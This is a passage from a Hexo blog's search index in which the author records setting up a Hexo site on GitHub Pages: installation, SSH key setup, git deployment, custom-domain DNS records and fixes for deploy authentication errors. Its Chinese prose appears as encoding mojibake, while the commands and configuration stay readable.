<h3 id="Hexo-å¤‡ä»½"><a href="#Hexo-å¤‡ä»½" class="headerlink" title="Hexo å¤‡ä»½"></a>Hexo å¤‡ä»½</h3><p><a href="http://www.xiaoliblog.cn/page/hexobackup.html#%E5%AE%89%E8%A3%85%E6%8F%92%E4%BB%B6">hexo-git-backup åšå®¢å¤‡ä»½åŠæ¢å¤</a><br><a href="https://github.com/coneycode/hexo-git-backup">git-backup</a></p>
<h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><ol>
<li>åœ¨è¿›è¡Œä¸ªæ€§åŒ–é…ç½®çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæƒ³è¦å®æ—¶æŸ¥çœ‹é…ç½®æ•ˆæœï¼Œç›´æ¥é‡‡ç”¨æœ¬åœ° <code>hexo s</code></li>
</ol>
<h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><p><a href="https://www.mdnice.com/writing/382af676baff4ed4ad5511074fb736da">https://www.mdnice.com/writing/382af676baff4ed4ad5511074fb736da</a></p>
<p><a href="https://blog.51cto.com/u_12877374/2853898">Hexoåšå®¢NexTä¸»é¢˜å¼€å¯æ–‡ç« ç›®å½•å’Œè°ƒæ•´æ ·å¼</a></p>
<p><a href="http://theme-next.iissnan.com/theme-settings.html">ä¸»é¢˜é…ç½®</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/460818216">hexoåšå®¢æ–°å¢RSSåŠŸèƒ½æ”¯æŒ</a></p>
<p><a href="https://tding.top/archives/42c38b10.html">Hexo-NexT (v7.0+) ä¸»é¢˜é…ç½®</a></p>
]]></content>
      <categories>
        <category>æ‚é¡¹</category>
      </categories>
      <tags>
        <tag>blogæ­å»º</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸ªäººåšå®¢æ­å»ºè®°å½•[1]</title>
    <url>/2022/05/02/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95-1/</url>
    <content><![CDATA[<span id="more"></span>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">OS Type: macOS</span><br><span class="line">OS Version: 10.15</span><br><span class="line">git 2.30.0</span><br><span class="line">node v16.11.0</span><br><span class="line">npm 8.0.0</span><br></pre></td></tr></table></figure>

<h3 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h3><p><strong>å®‰è£… hexo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line"></span><br><span class="line">$ hexo --version</span><br><span class="line">hexo-cli: 4.3.0</span><br><span class="line">os: darwin 19.6.0 10.15.7</span><br><span class="line"></span><br><span class="line">node: 16.11.0</span><br><span class="line">v8: 9.4.146.19-node.13</span><br><span class="line">uv: 1.42.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.9</span><br><span class="line">ares: 1.17.2</span><br><span class="line">modules: 93</span><br><span class="line">nghttp2: 1.45.1</span><br><span class="line">napi: 8</span><br><span class="line">llhttp: 6.0.2</span><br><span class="line">openssl: 1.1.1l</span><br><span class="line">cldr: 39.0</span><br><span class="line">icu: 69.1</span><br><span class="line">tz: 2021a</span><br><span class="line">unicode: 13.0</span><br></pre></td></tr></table></figure>

<p><strong>åˆå§‹åŒ– hexo</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init &lt;folder&gt; </span><br><span class="line">INFO  Cloning hexo-starter https://github.com/hexojs/hexo-starter.git</span><br><span class="line">INFO  Install dependencies</span><br><span class="line">INFO  Start blogging with Hexo!</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> &lt;folder&gt;</span><br><span class="line">$ npm install</span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ _config.landscape.yml </span><br><span class="line">â”œâ”€â”€ _config.yml <span class="comment"># ç½‘ç«™çš„é…ç½®ä¿¡æ¯</span></span><br><span class="line">â”œâ”€â”€ node_modules</span><br><span class="line">â”œâ”€â”€ package-lock.json</span><br><span class="line">â”œâ”€â”€ package.json <span class="comment"># åº”ç”¨ç¨‹åºçš„ä¿¡æ¯</span></span><br><span class="line">â”œâ”€â”€ scaffolds <span class="comment"># æ¨¡ç‰ˆæ–‡ä»¶å¤¹ - æ–°å»ºæ–‡ç« æ–‡ä»¶ä¸­é»˜è®¤æ·»åŠ çš„å†…å®¹</span></span><br><span class="line">â”œâ”€â”€ <span class="built_in">source</span> <span class="comment"># å­˜æ”¾ç”¨æˆ·èµ„æºçš„åœ°æ–¹</span></span><br><span class="line">â””â”€â”€ themes <span class="comment"># ä¸»é¢˜æ–‡ä»¶å¤¹ - ç”¨æ¥ç”Ÿæˆé™æ€é¡µé¢</span></span><br></pre></td></tr></table></figure>

<p><strong>é…ç½®è¿œç¨‹ä»“åº“</strong><br>åˆ›å»º git ä»“åº“ï¼Œä»“åº“åä¸º <name>.github.io</p>
<p>åœ¨æœ¬åœ°è®¾ç½® git é…ç½®ï¼Œå¹¶å°† ssh å…¬é’¥é…ç½®åˆ° github</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&#x27;&lt;gitname&gt;&#x27;</span></span><br><span class="line">$ git config --global user.email <span class="string">&#x27;&lt;gitemail&gt;&#x27;</span></span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;&lt;gitemail&gt;&quot;</span></span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ ssh æ˜¯å¦è®¾ç½®æˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh git@github.com</span><br><span class="line">PTY allocation request failed on channel 0</span><br><span class="line">Hi Yourname! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="string">Connection to github.com closed.</span></span><br></pre></td></tr></table></figure>

<p><strong>ç½‘ç«™ä¿¡æ¯é…ç½®</strong><br>é€šè¿‡ <code>_config.yml</code> ä¿®æ”¹é…ç½®</p>
<p>æ­¤å¤„ä¸»è¦è®¾ç½® <code>deploy</code>ï¼šå³ç»™ <code>hexo d</code> è¿›è¡Œé…ç½®å‘ŠçŸ¥ <code>hexo</code> å°† blog éƒ¨ç½²åœ¨å“ªé‡Œ</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">&#x27;git&#x27;</span></span><br><span class="line">  <span class="attr">repository:</span>  <span class="string">https://github.com/Yourname/Yourname.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>å®‰è£…éƒ¨ç½²æ’ä»¶ï¼Œå¹¶éƒ¨ç½²</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br><span class="line"></span><br><span class="line">$ hexo clean <span class="comment"># æ¸…é™¤ç¼“å­˜</span></span><br><span class="line">$ hexo g <span class="comment"># ç”Ÿæˆé™æ€æ–‡ä»¶</span></span><br><span class="line">$ hexo d <span class="comment"># éƒ¨ç½²ç½‘ç«™</span></span><br><span class="line">....</span><br><span class="line">To https://github.com/Yourname/Yourname.github.io.git</span><br><span class="line"> * [new branch]      HEAD -&gt; master</span><br><span class="line">åˆ†æ”¯ <span class="string">&#x27;master&#x27;</span> è®¾ç½®ä¸ºè·Ÿè¸ªæ¥è‡ª <span class="string">&#x27;https://github.com/Yourname/Yourname.github.io.git&#x27;</span> çš„è¿œç¨‹åˆ†æ”¯ <span class="string">&#x27;master&#x27;</span>ã€‚</span><br><span class="line">INFO  Deploy <span class="keyword">done</span>: git</span><br></pre></td></tr></table></figure>

<p><strong>ç»‘å®šåŸŸå</strong><br>ç»‘å®šåŸŸåéœ€è¦ä¸‰æ­¥</p>
<ol>
<li><p>åœ¨åŸŸåæœåŠ¡å•†ä¿®æ”¹è§£æè®°å½•é›†<br>æˆ‘ä½¿ç”¨çš„åä¸ºäº‘ï¼Œè®¾ç½® A å’Œ CNAME è®°å½•å¦‚ä¸‹å›¾<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205021542680.png"><br>A è®°å½•å¯ä»¥é€šè¿‡ç«™é•¿å·¥å…·è¿›è¡ŒæŸ¥è¯¢ <name>.github.io çš„ ip åœ°å€<br>æ³¨æ„ï¼šä¸èƒ½å¯¹åŒä¸€ä¸ªåŸŸååŒæ—¶è®¾ç½® A è®°å½•å’Œ CNAME è®°å½•ï¼Œä¼šé€ æˆå†²çª</p>
</li>
<li><p>åœ¨ github ä¿®æ”¹æä¾›æœåŠ¡çš„åŸŸå<br>åœ¨ <name>.github.io ä»“åº“ä¸­è¿›è¡Œè®¾ç½®åŸŸåï¼Œ<code>Settings-&gt;Pages-&gt;Custom domain</code>, è®¾ç½®ä¸ºè‡ªå·±çš„åŸŸå</p>
</li>
<li><p>åœ¨æœ¬åœ°åšå®¢æ·»åŠ è®°å½•é›†æ–‡ä»¶ CNAME</p>
 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">emiyada.cn</span><br></pre></td></tr></table></figure></li>
</ol>
<p>é‡æ–°éƒ¨ç½²</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
<p>ä»æµè§ˆå™¨æ‰“å¼€é¡µé¢å¯ä»¥çœ‹åˆ°<br><img src="https://cdn.jsdelivr.net/gh/darenfy/wiki-resources@master/202205021540840.png"></p>
<h3 id="æŠ¥é”™è§£å†³æ–¹å¼"><a href="#æŠ¥é”™è§£å†³æ–¹å¼" class="headerlink" title="æŠ¥é”™è§£å†³æ–¹å¼"></a>æŠ¥é”™è§£å†³æ–¹å¼</h3><ol>
<li><p>æ— æ³•è¯»å–è¿œç¨‹ä»“åº“</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fatal: <span class="string">&#x27;git@github.com/Yourname/Yourname.github.io.git&#x27;</span> does not appear to be a git repository</span><br><span class="line">fatal: æ— æ³•è¯»å–è¿œç¨‹ä»“åº“ã€‚</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¯èƒ½æ˜¯ç”±äºå°† deploy repo è®¾ç½®æˆ git@ è¿æ¥æ–¹å¼ï¼Œå»ºè®®æ”¹æˆ https è¿æ¥</p>
</li>
<li><p>é‰´æƒå¤±è´¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ <span class="keyword">for</span> more information.</span><br><span class="line">fatal: <span class="string">&#x27;https://github.com/Yourname/Yourname.github.io.git/&#x27;</span> é‰´æƒå¤±è´¥</span><br></pre></td></tr></table></figure>
<p>åœ¨éƒ¨ç½²çš„æ—¶å€™ä¼šæç¤ºè¾“å…¥ç”¨æˆ·åå’Œå¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Username for &#x27;https://github.com&#x27;:</span><br><span class="line">Password for &#x27;https://Yourname@github.com&#x27;:</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œå¦‚æœè¾“å…¥æ­£å¸¸çš„githubå¯†ç ä¼šæŠ¥é”™é‰´æƒå¤±è´¥ï¼Œå› ä¸ºåœ¨2020å¹´ä¹‹ågithubä¿®æ”¹æˆ token è®¤è¯æœºåˆ¶</p>
</li>
</ol>
<p>token å¯ä»¥é€šè¿‡ github çš„ <code>Settings-&gt;Developer settings-&gt;Personal access tokens</code> ç”Ÿæˆï¼Œå¹¶å°†å…¶ä½œä¸ºå¯†ç </p>
]]></content>
      <categories>
        <category>æ‚é¡¹</category>
      </categories>
      <tags>
        <tag>blogæ­å»º</tag>
      </tags>
  </entry>
</search>
